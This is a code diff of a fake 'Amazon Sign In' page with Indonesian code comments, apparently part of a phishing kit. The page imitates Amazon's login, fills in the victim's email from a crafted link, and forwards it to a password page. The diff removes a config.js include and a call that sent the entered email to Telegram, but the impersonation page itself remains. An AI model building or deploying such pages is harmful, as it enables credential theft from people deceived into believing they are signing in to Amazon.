@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign In</title>
-    <script src="config.js"></script>
     <style>
         * {
             margin: 0;
@@ -62,7 +61,6 @@
         }
         .input.error {
             border-color: #c40000;
-            box-shadow: none;
         }
         .pesan-error {
             color: #c40000;
@@ -76,8 +74,6 @@
             display: flex;
         }
         .ikon-error {
-            margin-top: 1px;
-            flex-shrink: 0;
             font-weight: bold;
         }
         .tombol-lanjut {
@@ -103,22 +99,9 @@
             color: #0066c0;
             text-decoration: none;
         }
-        .keterangan a:hover {
-            text-decoration: underline;
-        }
         .garis-pemisah {
             border-bottom: 1px solid #e7e7e7;
             margin: 18px 0;
-        }
-        .bagian-bisnis {
-            font-size: 13px;
-        }
-        .bagian-bisnis a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .bagian-bisnis a:hover {
-            text-decoration: underline;
         }
         .bawah {
             margin-top: 30px;
@@ -130,9 +113,6 @@
             color: #0066c0;
             text-decoration: none;
             margin: 0 8px;
-        }
-        .bawah a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
@@ -161,16 +141,7 @@
             <a href="#">Privacy Notice</a>.
         </div>
 
-        <div class="keterangan">
-            <a href="#">Need help?</a>
-        </div>
-
         <div class="garis-pemisah"></div>
-
-        <div style="font-size: 13px; font-weight: 700;">Buying for work?</div>
-        <div class="bagian-bisnis">
-            <a href="#">Create a free business account</a>
-        </div>
     </div>
 
     <div class="bawah">
@@ -179,27 +150,21 @@
             <a href="#">Privacy Notice</a>
             <a href="#">Help</a>
         </p>
-        <p style="margin-top: 5px; color: #888;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
 const inputEmail = document.getElementById('email');
-const tombolLanjut = document.getElementById('tombol-lanjut');
 const pesanError = document.getElementById('pesan-error');
 
-// Isi otomatis dari parameter URL jika ada
+// Isi otomatis dari link
 window.addEventListener('load', function() {
-    const params = new URLSearchParams(window.location.search);
     const url = window.location.href;
-    
-    // Cek pola: ?namaParam-email@domain.com-123=aktif
     const cocok = url.match(/-([^-]+@[^-]+)-\d+=aktif/);
     if (cocok && cocok[1]) {
         inputEmail.value = decodeURIComponent(cocok[1]);
     }
 });
 
-// Sembunyikan error saat mengetik
 inputEmail.addEventListener('input', function() {
     if (this.value.trim()) {
         pesanError.classList.remove('terlihat');
@@ -215,23 +180,14 @@ function lanjut() {
     const email = inputEmail.value.trim();
     
     if (!email) {
-        // Tampilkan error jika kosong
         pesanError.classList.add('terlihat');
         inputEmail.classList.add('error');
         return;
     }
 
-    // Simpan email untuk halaman password
+    // Simpan email ke penyimpanan
     localStorage.setItem('email_pengguna', email);
     
-    // Kirim data ke Telegram jika ada fungsi
-    if (window.kirimKeTelegram) {
-        window.kirimKeTelegram({
-            tipe: 'LOGIN',
-            email: email
-        });
-    }
-
     // Pindah ke halaman password
     window.location.href = 'password.html';
 }
